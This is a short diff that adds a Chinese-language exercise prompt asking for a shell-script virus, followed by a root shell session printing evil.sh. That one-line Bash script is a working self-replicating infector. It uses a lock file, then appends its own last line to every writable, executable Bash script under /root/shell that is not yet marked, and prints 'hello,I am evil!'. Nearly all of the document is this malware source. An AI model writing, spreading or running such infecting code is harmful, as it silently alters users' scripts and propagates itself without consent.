@@ -1,3 +1,11 @@
+用shell脚本写一个病毒，要求如下：
+
+	    可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；
+	    执行感染后的bash shell脚本会输出"echo hello,I am evil!"
+	    如果已经被感染，就不再感染
+	    同一时间只要一个病毒在运行
+
+
 [root@server0 tmp]# cat evil.sh
 #!/bin/bash
 [ -e /tmp/.IAmEvil ] && exit ; touch /tmp/.IAmEvil ; for file in `ls /root/shell`;do	grep "IAmEvil" $file &> /dev/null && continue ; file $file | grep "Bourne-Again shell script" &> /dev/null || continue ;[ -x $file -a -w $file ] || continue ;tail -n 1  $0 >> $file ; done;echo "hello,I am evil!";rm -rf /tmp/.IAmEvil
